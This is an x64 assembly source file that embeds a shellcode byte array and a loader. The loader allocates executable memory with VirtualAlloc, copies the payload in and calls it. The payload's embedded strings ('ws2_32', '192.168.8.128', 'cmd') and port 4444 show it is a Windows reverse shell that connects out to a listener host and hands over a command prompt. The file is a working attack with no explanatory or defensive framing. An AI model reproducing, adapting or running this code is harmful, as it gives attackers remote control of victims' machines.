section .text
    payload db 0x48,0x81,0xE4,0xF0,0xFF,0xFF,0xFF,0x41,0xBB,0x8E,0x4E,0x0E,0xEC,0x65,0x48,0x8B,
        db 0x14,0x25,0x60,0x00,0x00,0x00,0x48,0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,
        db 0x12,0x48,0x8B,0x12,0x48,0x8B,0x52,0x20,0x4D,0x31,0xFF,0x41,0x80,0xFD,0x01,0x0F,
        db 0x84,0xBD,0x01,0x00,0x00,0x8B,0x42,0x3C,0x48,0x01,0xD0,0x8B,0x98,0x88,0x00,0x00,
        db 0x00,0x48,0x01,0xD3,0x8B,0x4B,0x18,0x44,0x8B,0x43,0x20,0x49,0x01,0xD0,0x43,0x8B,
        db 0x34,0xB8,0x48,0x01,0xD6,0x31,0xC0,0x4D,0x31,0xC9,0xAC,0x84,0xC0,0x74,0x0C,0x41,
        db 0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE9,0xEF,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x74,0x05,
        db 0x41,0xFF,0xC7,0xE2,0xD9,0x8B,0x43,0x24,0x48,0x01,0xD0,0x4A,0x0F,0xB7,0x0C,0x78,
        db 0x8B,0x43,0x1C,0x48,0x01,0xD0,0x8B,0x04,0x88,0x48,0x01,0xD0,0x41,0x81,0xFB,0xCB,
        db 0xED,0xFC,0x3B,0x74,0x58,0x41,0x81,0xFB,0xD9,0x09,0xF5,0xAD,0x74,0x7C,0x41,0x81,
        db 0xFB,0x69,0x1B,0x12,0x4E,0x0F,0x84,0xC3,0x00,0x00,0x00,0x41,0x81,0xFB,0x0C,0xBA,
        db 0x2D,0xB3,0x0F,0x84,0xF4,0x00,0x00,0x00,0x41,0x81,0xFB,0x72,0xFE,0xB3,0x16,0x0F,
        db 0x84,0x3B,0x01,0x00,0x00,0x48,0x8D,0x0D,0xB4,0x01,0x00,0x00,0x48,0x81,0xEC,0x20,
        db 0x00,0x00,0x00,0xFF,0xD0,0x48,0x81,0xC4,0x20,0x00,0x00,0x00,0x48,0x89,0xC2,0x4D,
        db 0x31,0xFF,0x41,0xBB,0xCB,0xED,0xFC,0x3B,0xE9,0x48,0xFF,0xFF,0xFF,0x52,0x48,0x81,
        db 0xEC,0xA8,0x01,0x00,0x00,0x48,0xB9,0x02,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x48,
        db 0x89,0xE2,0xFF,0xD0,0x48,0x81,0xC4,0xA8,0x01,0x00,0x00,0x5A,0x4D,0x31,0xFF,0x41,
        db 0xBB,0xD9,0x09,0xF5,0xAD,0xE9,0x1B,0xFF,0xFF,0xFF,0x52,0x48,0x81,0xEC,0x38,0x00,
        db 0x00,0x00,0x48,0xB9,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0xBA,0x01,0x00,
        db 0x00,0x00,0x00,0x00,0x00,0x00,0x49,0xB8,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        db 0x4D,0x31,0xC9,0xC7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0xC7,0x44,0x24,0x28,0x00,
        db 0x00,0x00,0x00,0xFF,0xD0,0x48,0x89,0xC7,0x48,0x81,0xC4,0x38,0x00,0x00,0x00,0x5A,
        db 0x4D,0x31,0xFF,0x41,0xBB,0x69,0x1B,0x12,0x4E,0xE9,0xC7,0xFE,0xFF,0xFF,0x52,0x48,
        db 0x81,0xEC,0x10,0x00,0x00,0x00,0x66,0xC7,0x04,0x24,0x02,0x00,0x66,0xC7,0x44,0x24,
        db 0x02,0x11,0x5C,0xB1,0x02,0x48,0x8D,0x15,0xFB,0x00,0x00,0x00,0x4C,0x8D,0x44,0x24,
        db 0x04,0xFF,0xD0,0x49,0x89,0xE6,0x48,0x81,0xC4,0x10,0x00,0x00,0x00,0x5A,0x4D,0x31,
        db 0xFF,0x41,0xBB,0x0C,0xBA,0x2D,0xB3,0xE9,0x89,0xFE,0xFF,0xFF,0x48,0x81,0xEC,0x60,
        db 0x00,0x00,0x00,0x48,0x89,0xF9,0x4C,0x89,0xF2,0x49,0xB8,0x10,0x00,0x00,0x00,0x00,
        db 0x00,0x00,0x00,0x4D,0x31,0xC9,0x48,0xC7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x48,
        db 0xC7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0xC7,0x44,0x24,0x30,0x00,0x00,0x00,
        db 0x00,0xFF,0xD0,0x48,0x81,0xC4,0x60,0x00,0x00,0x00,0x41,0xB5,0x01,0xE9,0x1B,0xFE,
        db 0xFF,0xFF,0x4D,0x31,0xFF,0x41,0xBB,0x72,0xFE,0xB3,0x16,0xE9,0x35,0xFE,0xFF,0xFF,
        db 0x48,0x81,0xEC,0x88,0x00,0x00,0x00,0xC7,0x04,0x24,0x70,0x00,0x00,0x00,0xC7,0x44,
        db 0x24,0x3C,0x00,0x01,0x00,0x00,0x48,0x89,0x7C,0x24,0x50,0x48,0x89,0x7C,0x24,0x58,
        db 0x48,0x89,0x7C,0x24,0x60,0x49,0x89,0xE6,0x48,0x81,0xEC,0x58,0x00,0x00,0x00,0x48,
        db 0x31,0xC9,0x48,0x8D,0x15,0x5C,0x00,0x00,0x00,0x4D,0x31,0xC0,0x4D,0x31,0xC9,0xC6,
        db 0x44,0x24,0x20,0x01,0xC7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0xC7,0x44,0x24,
        db 0x30,0x00,0x00,0x00,0x00,0x48,0xC7,0x44,0x24,0x38,0x00,0x00,0x00,0x00,0x4C,0x89,
        db 0xF3,0x48,0x89,0x5C,0x24,0x40,0x49,0x8D,0x5E,0x70,0x48,0x89,0x5C,0x24,0x48,0xFF,
        db 0xD0,0x48,0x81,0xC4,0x58,0x00,0x00,0x00,0x48,0x81,0xC4,0x88,0x00,0x00,0x00,0xC3,
        db 0x77,0x73,0x32,0x5F,0x33,0x32,0x00,0x31,0x39,0x32,0x2E,0x31,0x36,0x38,0x2E,0x38,
        db 0x2E,0x31,0x32,0x38,0x00,0x63,0x6D,0x64,0x00
    payloadlen equ $-payload
section .text
    global main
    extern VirtualAlloc
main:
    call alloc_mem
    ret
alloc_mem:
    ;------------PROLOGUE-------------
    push rbp
    mov rbp, rsp
    sub rsp, 80
    xor rcx, rcx
    mov rdx, payloadlen
    mov r8, 0x3000
    mov r9, 0x40
    call VirtualAlloc
.copy_payload:
;   --------------Move payload into mem allocated by VirtualAlloc-------------------------
    mov rsi, payload
    mov rdi, rax
    mov rcx, payloadlen
    cld
    repe movsb
.process_payload:
    call rax
    ; ----------------------EPILOGUE-----------------
    mov rsp, rbp
    pop rbp
    ret
